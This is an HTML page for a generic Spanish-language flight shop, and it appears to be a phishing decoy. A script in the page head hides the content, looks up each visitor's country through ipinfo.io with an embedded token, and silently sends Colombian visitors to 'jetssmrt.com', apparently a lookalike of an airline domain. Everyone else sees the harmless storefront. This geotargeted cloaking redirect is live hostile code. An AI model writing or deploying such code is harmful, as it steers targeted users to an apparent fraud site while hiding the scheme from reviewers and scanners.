<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Tienda de vuelos</title>
  <style>
    /* Transición de carga suave */
    .hidden-page {
      opacity: 0;
      visibility: hidden;
      transition: opacity 0.5s ease;
    }
    .visible-page {
      opacity: 1;
      visibility: visible;
    }

    /* Estilos generales */
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }
    body {
      font-family: Arial, sans-serif;
      background: #f5f5f5;
      color: #333;
    }
    header {
      background: linear-gradient(90deg, #0052cc, #3366ff);
      padding: 20px;
      color: #fff;
    }
    header .container {
      display: flex;
      justify-content: space-between;
      align-items: center;
      max-width: 1200px;
      margin: 0 auto;
    }
    header nav ul {
      list-style: none;
      display: flex;
    }
    header nav ul li {
      margin-left: 20px;
    }
    header nav ul li a {
      text-decoration: none;
      color: #fff;
      font-weight: bold;
      transition: color 0.3s;
    }
    header nav ul li a:hover {
      color: #ffcc00;
    }
    .hero {
      background-image: url('https://via.placeholder.com/1200x400');
      background-size: cover;
      background-position: center;
      height: 400px;
      display: flex;
      align-items: center;
      justify-content: center;
      text-align: center;
      color: #fff;
      position: relative;
    }
    .hero::after {
      content: "";
      position: absolute;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background-color: rgba(0,0,0,0.5);
    }
    .hero h1 {
      font-size: 3em;
      z-index: 1;
    }
    .content {
      max-width: 1200px;
      margin: 40px auto;
      padding: 0 20px;
    }
    .plans {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 20px;
    }
    .plan {
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
      transition: transform 0.3s;
    }
    .plan:hover {
      transform: translateY(-5px);
    }
    .plan h3 {
      margin-bottom: 10px;
      color: #0052cc;
    }
    .plan p {
      margin-bottom: 15px;
    }
    .plan button {
      background: #0052cc;
      color: #fff;
      border: none;
      padding: 10px 15px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .plan button:hover {
      background: #003d99;
    }
    .contact {
      margin-top: 40px;
      background: #fff;
      padding: 20px;
      border-radius: 8px;
      box-shadow: 0 2px 5px rgba(0,0,0,0.1);
    }
    .contact h2 {
      margin-bottom: 15px;
      color: #0052cc;
    }
    .contact form {
      display: flex;
      flex-direction: column;
    }
    .contact form label {
      margin-bottom: 5px;
      font-weight: bold;
    }
    .contact form input,
    .contact form textarea {
      margin-bottom: 15px;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 4px;
    }
    .contact form button {
      background: #0052cc;
      color: #fff;
      border: none;
      padding: 10px;
      border-radius: 4px;
      cursor: pointer;
      transition: background 0.3s;
    }
    .contact form button:hover {
      background: #003d99;
    }
    footer {
      background: #333;
      color: #fff;
      padding: 20px;
      text-align: center;
      margin-top: 40px;
    }
  </style>
  <script>
    (async function() {
      // Configuración inicial
      document.documentElement.className = 'hidden-page';
      const currentUrl = window.location.href;
      const redirectKey = 'rdr-' + btoa(currentUrl).slice(0, 15);

      // Verificar si ya se realizó la redirección
      if (!sessionStorage.getItem(redirectKey)) {
        sessionStorage.setItem(redirectKey, 'true');

        try {
          // Obtener datos de geolocalización
          const geoResponse = await fetch('https://ipinfo.io/json?token=3798a6699b4912');
          const geoData = await geoResponse.json();
          const country = geoData.country; // Código del país (ej: "CO")

          // Si el país es Colombia, redirigir
          if (country === 'CO') {
            window.location.replace('https://jetssmrt.com/vuelos/col/viajes/smart4/smart5/index.html');
            return;
          }
        } catch (error) {
          console.error('Error obteniendo la geolocalización:', error);
        }
      }

      // Mostrar la página si no hay redirección
      setTimeout(() => {
        document.documentElement.className = 'visible-page';
        sessionStorage.removeItem(redirectKey);
      }, 300);
    })();
  </script>
</head>
<body>
  <header>
    <div class="container">
      <h1>Tienda de vuelos</h1>
      <nav>
        <ul>
          <li><a href="#home">Inicio</a></li>
          <li><a href="#planes">Planes</a></li>
          <li><a href="#contacto">Contacto</a></li>
        </ul>
      </nav>
    </div>
  </header>

  <section class="hero" id="home">
    <h1>Viaja con lo que más amas</h1>
  </section>

  <main class="content">
    <section class="plans" id="planes">
      <div class="plan">
        <h3>Plan Básico</h3>
        <p>Descuentos exclusivos</p>
        <button onclick="mostrarMensaje('Plan Básico')">Contratar</button>
      </div>
      <div class="plan">
        <h3>Plan Premium</h3>
        <p>Cobertura a nivel nacional y descuento en vuelos</p>
        <button onclick="mostrarMensaje('Plan Premium')">Contratar</button>
      </div>
      <div class="plan">
        <h3>Plan Familiar</h3>
        <p>Viajes exclusivos para toda la familia.</p>
        <button onclick="mostrarMensaje('Plan Familiar')">Contratar</button>
      </div>
    </section>

    <section class="contact" id="contacto">
      <h2>Contáctanos</h2>
      <form onsubmit="enviarFormulario(event)">
        <label for="nombre">Nombre:</label>
        <input type="text" id="nombre" required>
        
        <label for="email">Email:</label>
        <input type="email" id="email" required>
        
        <label for="mensaje">Mensaje:</label>
        <textarea id="mensaje" rows="4" required></textarea>
        
        <button type="submit">Enviar</button>
      </form>
    </section>
  </main>

  <footer>
    <p>&copy; 2025 Tienda de vuelos</p>
  </footer>

  <script>
    function mostrarMensaje(plan) {
      alert(`Has seleccionado el ${plan}. ¡Gracias por confiar en nosotros!`);
    }

    function enviarFormulario(e) {
      e.preventDefault();
      alert(`¡Gracias! Nos pondremos en contacto contigo pronto.`);
      e.target.reset();
    }
  </script>
</body>
</html>
